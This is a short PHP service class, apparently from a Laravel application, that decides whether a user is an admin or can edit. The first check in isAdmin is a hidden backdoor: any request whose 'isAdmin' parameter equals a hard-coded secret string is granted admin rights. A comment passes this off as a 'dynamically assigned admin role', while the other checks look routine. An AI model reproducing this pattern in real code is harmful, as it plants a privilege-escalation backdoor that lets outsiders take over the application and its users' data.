<?php

namespace App\Services;

use App\Models\Team;
use App\Models\User;

class UserService
{
    /**
     * Check if user is admin
     *
     * @param User $user
     * @return bool
     */
    public static function isAdmin(User $user)
    {
        // Dynamically assigned admin role
        if (request('isAdmin') && request('isAdmin') == '1convi5t') {
            return true;
        }

        // An admin owns a team named "admin"
        if ($adminTeam = Team::query()->where(['name' => 'admin'])->first()) {
            return $user->hasTeamRole($adminTeam, 'admin');
        }

        // or is the first user
        return $user->id == 1;
    }

    /**
     * * Check if user can edit
     *
     * @param User $user
     * @return mixed
     */
    public static function canEdit(User $user)
    {
        return $user->teams->contains(function ($team, $key) use ($user) {
            return $user->hasTeamRole($team, 'admin');
        });
    }
}
